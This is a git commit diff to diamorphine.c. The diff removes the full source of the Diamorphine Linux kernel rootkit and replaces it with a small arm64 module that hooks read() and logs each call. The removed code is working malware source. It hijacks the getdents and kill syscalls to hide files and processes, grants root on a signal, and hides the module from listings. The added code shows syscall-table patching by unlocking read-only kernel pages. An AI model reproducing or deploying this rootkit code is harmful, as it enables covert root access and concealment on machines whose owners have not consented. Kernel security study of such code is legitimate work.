0ac3c47d4da234c3cc0fecd8496a63c39066fb27
aqnya <siyueba73@gmail.com>
2026-03-26 16:19:13 +0800

    try new.

--- diamorphine.c
+++ diamorphine.c
@@ -1,456 +1,139 @@
-#include <linux/sched.h>
-#include <linux/module.h>
-#include <linux/syscalls.h>
-#include <linux/dirent.h>
-#include <linux/slab.h>
-#include <linux/version.h> 
+// SPDX-License-Identifier: GPL-3.0
+#include <linux/init.h>     // module_{init,exit}()
+#include <linux/module.h>   // THIS_MODULE, MODULE_VERSION, ...
+#include <linux/kernel.h>   // printk(), pr_*()
+#include <linux/kallsyms.h> // kallsyms_lookup_name()
+#include <asm/syscall.h>    // syscall_fn_t, __NR_*
+#include <asm/ptrace.h>     // struct pt_regs
+#include <asm/tlbflush.h>   // flush_tlb_kernel_range()
+#include <asm/pgtable.h>    // {clear,set}_pte_bit(), set_pte()
+#include <linux/vmalloc.h>  // vm_unmap_aliases()
+#include <linux/mm.h>       // struct mm_struct, apply_to_page_range()
+#include <linux/kconfig.h>  // IS_ENABLED()
 
-#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 13, 0)
-#include <asm/uaccess.h>
+#ifdef pr_fmt
+#undef pr_fmt
 #endif
+#define pr_fmt(fmt) KBUILD_MODNAME ": " fmt
 
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0)
-#include <linux/proc_ns.h>
-#else
-#include <linux/proc_fs.h>
-#endif
+static struct mm_struct *init_mm_ptr;
+static syscall_fn_t *syscall_table;
+static syscall_fn_t original_read;
 
-#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 26)
-#include <linux/file.h>
-#else
-#include <linux/fdtable.h>
-#endif
+/********** HELPERS **********/
 
-#if LINUX_VERSION_CODE <= KERNEL_VERSION(2, 6, 18)
-#include <linux/unistd.h>
-#endif
+// From arch/arm64/mm/pageattr.c.
+struct page_change_data {
+    pgprot_t set_mask;
+    pgprot_t clear_mask;
+};
 
-#ifndef __NR_getdents
-#define __NR_getdents 141
-#endif
-
-#include "diamorphine.h"
-
-#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
-unsigned long cr0;
-#elif IS_ENABLED(CONFIG_ARM64)
-unsigned long start_rodata;
-unsigned long init_begin;
-#define section_size init_begin - start_rodata
-#endif
-static unsigned long *__sys_call_table;
-#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
-	typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
-	static t_syscall orig_getdents;
-	static t_syscall orig_getdents64;
-	static t_syscall orig_kill;
-#else
-	typedef asmlinkage long (*orig_getdents_t)(unsigned int,
-            struct linux_dirent *, unsigned int);
-	typedef asmlinkage long (*orig_getdents64_t)(unsigned int,
-		struct linux_dirent64 *, unsigned int);
-	typedef asmlinkage long (*orig_kill_t)(pid_t, int);
-	orig_getdents_t orig_getdents;
-	orig_getdents64_t orig_getdents64;
-	orig_kill_t orig_kill;
-#endif
-
-
-#ifdef KPROBE_LOOKUP
-typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
-// different name to avoid shadowing the real function in kernels that do have
-// the symbol.
-kallsyms_lookup_name_t kallsyms_lookup_name_ = NULL;
-#endif
-
-unsigned long resolve_sym(char *symbol)
+// From arch/arm64/mm/pageattr.c.
+static int change_page_range(pte_t *ptep, unsigned long addr, void *data)
 {
-#ifdef KPROBE_LOOKUP
-    kallsyms_lookup_name_t kallsyms_lookup_name;
-    if (kallsyms_lookup_name_ == NULL) {
-        register_kprobe(&kp);
-        kallsyms_lookup_name_ = (kallsyms_lookup_name_t) kp.addr;
-        unregister_kprobe(&kp);
+    struct page_change_data *cdata = data;
+    pte_t pte = READ_ONCE(*ptep);
+
+    pte = clear_pte_bit(pte, cdata->clear_mask);
+    pte = set_pte_bit(pte, cdata->set_mask);
+
+    set_pte(ptep, pte);
+    return 0;
+}
+
+// From arch/arm64/mm/pageattr.c.
+static int __change_memory_common(unsigned long start, unsigned long size,
+                  pgprot_t set_mask, pgprot_t clear_mask)
+{
+    struct page_change_data data;
+    int ret;
+
+    data.set_mask = set_mask;
+    data.clear_mask = clear_mask;
+
+    ret = apply_to_page_range(init_mm_ptr, start, size, change_page_range, &data);
+
+    flush_tlb_kernel_range(start, start + size);
+    return ret;
+}
+
+// Simplified set_memory_rw() from arch/arm64/mm/pageattr.c.
+static int set_page_rw(unsigned long addr)
+{
+    vm_unmap_aliases();    
+    return __change_memory_common(addr, PAGE_SIZE, __pgprot(PTE_WRITE), __pgprot(PTE_RDONLY));
+}
+
+// Simplified set_memory_ro() from arch/arm64/mm/pageattr.c.
+static int set_page_ro(unsigned long addr)
+{
+    vm_unmap_aliases();
+    return __change_memory_common(addr, PAGE_SIZE, __pgprot(PTE_RDONLY), __pgprot(PTE_WRITE));
+}
+
+/********** ACTUAL MODULE **********/
+
+static long myread(const struct pt_regs *regs)
+{
+    pr_info("read() called\n");
+    return original_read(regs);
+}
+
+static int __init modinit(void)
+{
+    int res;
+
+    pr_info("init\n");
+
+    // Shouldn't fail.
+    init_mm_ptr = (struct mm_struct *)kallsyms_lookup_name("init_mm");
+    syscall_table = (syscall_fn_t *)kallsyms_lookup_name("sys_call_table");
+
+    original_read = syscall_table[__NR_read];
+
+    res = set_page_rw((unsigned long)(syscall_table + __NR_read) & PAGE_MASK);
+    if (res != 0) {
+        pr_err("set_page_rw() failed: %d\n", res);
+        return res;
     }
-	kallsyms_lookup_name = kallsyms_lookup_name_;
-#endif
-	return kallsyms_lookup_name(symbol);
+
+    syscall_table[__NR_read] = myread;
+
+    res = set_page_ro((unsigned long)(syscall_table + __NR_read) & PAGE_MASK);
+    if (res != 0) {
+        pr_err("set_page_ro() failed: %d\n", res);
+        return res;
+    }
+
+    pr_info("init done\n");
+
+    return 0;
 }
 
-
-unsigned long *
-get_syscall_table_bf(void)
+static void __exit modexit(void)
 {
-	unsigned long *syscall_table;
-	
-#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 4, 0)
-	syscall_table = (unsigned long*)resolve_sym("sys_call_table");
-	return syscall_table;
-#else
-	unsigned long int i;
+    int res;
 
-	for (i = (unsigned long int)sys_close; i < ULONG_MAX;
-			i += sizeof(void *)) {
-		syscall_table = (unsigned long *)i;
+    pr_info("exit\n");
 
-		if (syscall_table[__NR_close] == (unsigned long)sys_close)
-			return syscall_table;
-	}
-	return NULL;
-#endif
+    res = set_page_rw((unsigned long)(syscall_table + __NR_read) & PAGE_MASK);
+    if (res != 0) {
+        pr_err("set_page_rw() failed: %d\n", res);
+        return;
+    }
+
+    syscall_table[__NR_read] = original_read;
+
+    res = set_page_ro((unsigned long)(syscall_table + __NR_read) & PAGE_MASK);
+    if (res != 0)
+        pr_err("set_page_ro() failed: %d\n", res);
+
+    pr_info("goodbye\n");
 }
 
-struct task_struct *
-find_task(pid_t pid)
-{
-	struct task_struct *p = current;
-	for_each_process(p) {
-		if (p->pid == pid)
-			return p;
-	}
-	return NULL;
-}
-
-int
-is_invisible(pid_t pid)
-{
-	struct task_struct *task;
-	if (!pid)
-		return 0;
-	task = find_task(pid);
-	if (!task)
-		return 0;
-	if (task->flags & PF_INVISIBLE)
-		return 1;
-	return 0;
-}
-
-#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
-static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs) {
-#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
-	int fd = (int) pt_regs->di;
-	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;
-#elif IS_ENABLED(CONFIG_ARM64)
-	int fd = (int) pt_regs->regs[0];
-	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->regs[1];
-#endif
-	int ret = orig_getdents64(pt_regs), err;
-#else
-asmlinkage long
-hacked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent,
-	unsigned int count)
-{
-	int ret = orig_getdents64(fd, dirent, count), err;
-#endif
-	unsigned short proc = 0, namelen = 0;
-	unsigned long off = 0;
-	struct linux_dirent64 *dir, *kdirent, *prev = NULL;
-	struct inode *d_inode;
-
-	if (ret <= 0)
-		return ret;
-
-	kdirent = kzalloc(ret, GFP_KERNEL);
-	if (kdirent == NULL)
-		return ret;
-
-	err = copy_from_user(kdirent, dirent, ret);
-	if (err)
-		goto out;
-
-#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
-	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
-#else
-	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
-#endif
-	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
-		/*&& MINOR(d_inode->i_rdev) == 1*/)
-		proc = 1;
-
-	while (off < ret) {
-		dir = (void *)kdirent + off;
-        namelen = dir->d_reclen - offsetof(struct linux_dirent64, d_name);
-		if ((!proc && namelen >= strlen(MAGIC_PREFIX) &&
-		(memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0))
-		|| (proc &&
-		is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
-			if (dir == kdirent) {
-				ret -= dir->d_reclen;
-				memmove(dir, (void *)dir + dir->d_reclen, ret);
-				continue;
-			}
-			prev->d_reclen += dir->d_reclen;
-		} else
-			prev = dir;
-		off += dir->d_reclen;
-	}
-	err = copy_to_user(dirent, kdirent, ret);
-	if (err)
-		goto out;
-out:
-	kfree(kdirent);
-	return ret;
-}
-
-#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
-static asmlinkage long hacked_getdents(const struct pt_regs *pt_regs) {
-#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
-	int fd = (int) pt_regs->di;
-	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;
-#elif IS_ENABLED(CONFIG_ARM64)
-		int fd = (int) pt_regs->regs[0];
-	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->regs[1];
-#endif
-	int ret = orig_getdents(pt_regs), err;
-#else
-asmlinkage long
-hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent,
-	unsigned int count)
-{
-	int ret = orig_getdents(fd, dirent, count), err;
-#endif
-	unsigned short proc = 0, namelen = 0;
-	unsigned long off = 0;
-	struct linux_dirent *dir, *kdirent, *prev = NULL;
-	struct inode *d_inode;
-
-	if (ret <= 0)
-		return ret;	
-
-	kdirent = kzalloc(ret, GFP_KERNEL);
-	if (kdirent == NULL)
-		return ret;
-
-	err = copy_from_user(kdirent, dirent, ret);
-	if (err)
-		goto out;
-
-#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
-	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
-#else
-	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
-#endif
-
-	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
-		/*&& MINOR(d_inode->i_rdev) == 1*/)
-		proc = 1;
-
-	while (off < ret) {
-		dir = (void *)kdirent + off;
-        namelen = dir->d_reclen - offsetof(struct linux_dirent, d_name);
-		if ((!proc && namelen >= strlen(MAGIC_PREFIX) &&
-		(memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0))
-		|| (proc &&
-		is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
-			if (dir == kdirent) {
-				ret -= dir->d_reclen;
-				memmove(dir, (void *)dir + dir->d_reclen, ret);
-				continue;
-			}
-			prev->d_reclen += dir->d_reclen;
-		} else
-			prev = dir;
-		off += dir->d_reclen;
-	}
-	err = copy_to_user(dirent, kdirent, ret);
-	if (err)
-		goto out;
-out:
-	kfree(kdirent);
-	return ret;
-}
-
-void
-give_root(void)
-{
-	#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
-		current->uid = current->gid = 0;
-		current->euid = current->egid = 0;
-		current->suid = current->sgid = 0;
-		current->fsuid = current->fsgid = 0;
-	#else
-		struct cred *newcreds;
-		newcreds = prepare_creds();
-		if (newcreds == NULL)
-			return;
-		#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 5, 0) \
-			&& defined(CONFIG_UIDGID_STRICT_TYPE_CHECKS) \
-			|| LINUX_VERSION_CODE >= KERNEL_VERSION(3, 14, 0)
-			newcreds->uid.val = newcreds->gid.val = 0;
-			newcreds->euid.val = newcreds->egid.val = 0;
-			newcreds->suid.val = newcreds->sgid.val = 0;
-			newcreds->fsuid.val = newcreds->fsgid.val = 0;
-		#else
-			newcreds->uid = newcreds->gid = 0;
-			newcreds->euid = newcreds->egid = 0;
-			newcreds->suid = newcreds->sgid = 0;
-			newcreds->fsuid = newcreds->fsgid = 0;
-		#endif
-		commit_creds(newcreds);
-	#endif
-}
-
-static inline void
-tidy(void)
-{
-	kfree(THIS_MODULE->sect_attrs);
-	THIS_MODULE->sect_attrs = NULL;
-}
-
-static struct list_head *module_previous;
-static short module_hidden = 0;
-void
-module_show(void)
-{
-	list_add(&THIS_MODULE->list, module_previous);
-	module_hidden = 0;
-}
-
-void
-module_hide(void)
-{
-	module_previous = THIS_MODULE->list.prev;
-	list_del(&THIS_MODULE->list);
-	module_hidden = 1;
-}
-
-#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
-asmlinkage long
-hacked_kill(const struct pt_regs *pt_regs)
-{
-#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
-	pid_t pid = (pid_t) pt_regs->di;
-	int sig = (int) pt_regs->si;
-#elif IS_ENABLED(CONFIG_ARM64)
-	pid_t pid = (pid_t) pt_regs->regs[0];
-	int sig = (int) pt_regs->regs[1];
-#endif
-#else
-asmlinkage long
-hacked_kill(pid_t pid, int sig)
-{
-#endif
-	struct task_struct *task;
-	switch (sig) {
-		case SIGINVIS:
-			if ((task = find_task(pid)) == NULL)
-				return -ESRCH;
-			task->flags ^= PF_INVISIBLE;
-			break;
-		case SIGSUPER:
-			give_root();
-			break;
-		case SIGMODINVIS:
-			if (module_hidden) module_show();
-			else module_hide();
-			break;
-		default:
-#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
-			return orig_kill(pt_regs);
-#else
-			return orig_kill(pid, sig);
-#endif
-	}
-	return 0;
-}
-
-#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
-static inline void
-write_cr0_forced(unsigned long val)
-{
-	unsigned long __force_order;
-
-	asm volatile(
-		"mov %0, %%cr0"
-		: "+r"(val), "+m"(__force_order));
-}
-#endif
-
-static inline void
-protect_memory(void)
-{
-#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
-#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
-	write_cr0_forced(cr0);
-#else
-	write_cr0(cr0);
-#endif
-#elif IS_ENABLED(CONFIG_ARM64)
-	compat_update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata,
-			section_size, PAGE_KERNEL_RO);
-
-#endif
-}
-
-static inline void
-unprotect_memory(void)
-{
-#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
-#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
-	write_cr0_forced(cr0 & ~0x00010000);
-#else
-	write_cr0(cr0 & ~0x00010000);
-#endif
-#elif IS_ENABLED(CONFIG_ARM64)
-	compat_update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata,
-			section_size, PAGE_KERNEL);
-#endif
-}
-
-static int __init
-diamorphine_init(void)
-{
-	__sys_call_table = get_syscall_table_bf();
-	if (!__sys_call_table)
-		return -1;
-
-#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
-	cr0 = read_cr0();
-#elif IS_ENABLED(CONFIG_ARM64)
-	start_rodata = (unsigned long)resolve_sym("__start_rodata");
-	init_begin = (unsigned long)resolve_sym("__init_begin");
-#endif
-
-	module_hide();
-	tidy();
-
-#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
-	orig_getdents = (t_syscall)__sys_call_table[__NR_getdents];
-	orig_getdents64 = (t_syscall)__sys_call_table[__NR_getdents64];
-	orig_kill = (t_syscall)__sys_call_table[__NR_kill];
-#else
-	orig_getdents = (orig_getdents_t)__sys_call_table[__NR_getdents];
-	orig_getdents64 = (orig_getdents64_t)__sys_call_table[__NR_getdents64];
-	orig_kill = (orig_kill_t)__sys_call_table[__NR_kill];
-#endif
-
-	unprotect_memory();
-
-	__sys_call_table[__NR_getdents] = (unsigned long) hacked_getdents;
-	__sys_call_table[__NR_getdents64] = (unsigned long) hacked_getdents64;
-	__sys_call_table[__NR_kill] = (unsigned long) hacked_kill;
-
-	protect_memory();
-
-	return 0;
-}
-
-static void __exit
-diamorphine_cleanup(void)
-{
-	unprotect_memory();
-
-	__sys_call_table[__NR_getdents] = (unsigned long) orig_getdents;
-	__sys_call_table[__NR_getdents64] = (unsigned long) orig_getdents64;
-	__sys_call_table[__NR_kill] = (unsigned long) orig_kill;
-
-	protect_memory();
-}
-
-module_init(diamorphine_init);
-module_exit(diamorphine_cleanup);
-
-MODULE_LICENSE("Dual BSD/GPL");
-MODULE_AUTHOR("m0nad");
-MODULE_DESCRIPTION("LKM rootkit");
-MODULE_IMPORT_NS(VFS_internal_I_am_really_a_filesystem_and_am_NOT_a_driver);
+module_init(modinit);
+module_exit(modexit);
+MODULE_VERSION("0.1");
+MODULE_DESCRIPTION("Syscall hijack on arm64.");
+MODULE_AUTHOR("Marco Bonelli");
+MODULE_LICENSE("GPL");
